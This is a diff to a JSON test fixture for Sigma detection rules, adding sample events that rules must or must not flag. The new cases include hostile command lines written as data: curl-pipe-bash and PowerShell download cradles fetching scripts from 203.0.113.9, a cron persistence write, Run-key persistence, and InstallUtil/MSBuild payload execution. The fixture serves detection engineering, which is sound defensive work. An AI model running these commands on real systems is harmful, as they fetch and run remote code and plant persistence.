@@ -381,8 +381,8 @@
     ]
   },
   {
-    "id": "windows_certutil_encode",
-    "file": "rules/sigma/windows_certutil_encode.yml",
+    "id": "windows_certutil_decode",
+    "file": "rules/sigma/windows_certutil_decode.yml",
     "must_fire": [
       [
         {
@@ -410,7 +410,8 @@
           "parent": "cmd.exe"
         }
       ]
-    ]
+    ],
+    "expected_level": "medium"
   },
   {
     "id": "windows_com_hijack_registry",
@@ -566,6 +567,13 @@
           "cmdline": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\Public\\p.dll",
           "parent": "cmd.exe"
         }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "installutil.exe",
+          "cmdline": "InstallUtil.exe /logfile= /u C:\\Users\\Public\\payload.dll"
+        }
       ]
     ],
     "must_not_fire": [
@@ -678,6 +686,13 @@
           "cmdline": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Users\\Public\\payload.xml",
           "parent": "cmd.exe"
         }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "msbuild.exe",
+          "cmdline": "MSBuild.exe C:\\Users\\Public\\payload.csproj"
+        }
       ]
     ],
     "must_not_fire": [
@@ -757,6 +772,13 @@
           "cmdline": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d C:\\Users\\u\\AppData\\x.exe /f",
           "parent": "cmd.exe"
         }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name Upd -Value 'C:\\Users\\Public\\x.exe'"
+        }
       ]
     ],
     "must_not_fire": [
@@ -782,6 +804,20 @@
           "process": "reg.exe",
           "cmdline": "reg add HKCU\\Software\\Vendor /v Theme /t REG_DWORD /d 1 /f",
           "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "reg.exe",
+          "cmdline": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /d 1 /f"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "reg.exe",
+          "cmdline": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runtime /v Theme /d 1 /f"
         }
       ]
     ]
@@ -945,6 +981,154 @@
           "class": "process_exec",
           "process": "bitsadmin.exe",
           "cmdline": "bitsadmin /list /allusers"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_certutil_encode",
+    "file": "rules/sigma/windows_certutil_encode.yml",
+    "expected_level": "low",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "certutil.exe",
+          "cmdline": "certutil -encode cert.der cert.pem"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "certutil.exe",
+          "cmdline": "certutil -encodehex input.bin output.txt"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "cmd.exe",
+          "cmdline": "cmd /c certutil -encode cert.der cert.pem"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell -c certutil -encode cert.der cert.pem"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "linux_download_exec",
+    "file": "rules/sigma/linux_download_exec.yml",
+    "expected_level": "high",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "sh",
+          "cmdline": "sh -c 'curl -s http://203.0.113.9/x.sh | bash'"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "curl",
+          "parent": "cron",
+          "cmdline": "curl https://hc-ping.example/uuid"
+        },
+        {
+          "class": "process_exec",
+          "process": "bash",
+          "parent": "sshd",
+          "cmdline": "/bin/bash /home/synthetic/deploy.sh"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "curl",
+          "cmdline": "curl -O https://releases.example.org/tool.tgz"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "linux_persistence_cron_systemd",
+    "file": "rules/sigma/linux_persistence_cron_systemd.yml",
+    "expected_level": "medium",
+    "must_fire": [
+      [
+        {
+          "class": "file_open",
+          "process": "bash",
+          "file_path": "/etc/cron.d/upd",
+          "file_write": true,
+          "cmdline": "bash -c 'echo curl http://203.0.113.9/x | sh > /etc/cron.d/upd'"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "systemctl",
+          "cmdline": "systemctl enable --now docker"
+        }
+      ],
+      [
+        {
+          "class": "file_open",
+          "process": "dpkg",
+          "file_path": "/etc/cron.d/sysstat",
+          "file_write": true
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_powershell_download_cradle",
+    "file": "rules/sigma/windows_powershell_download_cradle.yml",
+    "expected_level": "medium",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')\"",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell -c \"iwr http://203.0.113.9/a.ps1 -UseBasicParsing | iex\"",
+          "parent": "cmd.exe"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell.exe -c (New-Object Net.WebClient).DownloadString('https://api.ipify.org')",
+          "parent": "explorer.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell.exe -c Invoke-WebRequest https://vendor.example/tool.zip -OutFile C:\\Temp\\tool.zip",
+          "parent": "explorer.exe"
         }
       ]
     ]
